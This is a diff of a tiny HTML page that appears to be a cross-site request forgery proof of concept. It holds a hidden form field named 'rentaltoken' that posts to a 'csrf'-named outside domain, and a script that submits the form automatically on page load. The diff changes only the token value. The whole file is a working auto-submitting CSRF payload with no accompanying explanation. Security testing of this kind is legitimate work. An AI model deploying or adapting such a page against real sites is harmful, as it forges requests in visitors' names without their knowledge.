@@ -1,7 +1,7 @@
 <html>
 	<body>
 	  <form method=POST action=http://csrf1.adriaan.haxx.be>
-		    <input type=hidden name=rentaltoken value=vILIwnCMib>
+		    <input type=hidden name=rentaltoken value=dtW1uYjCWr>
 		    </form>
 		  <script>
 		  	document.forms[0].submit();
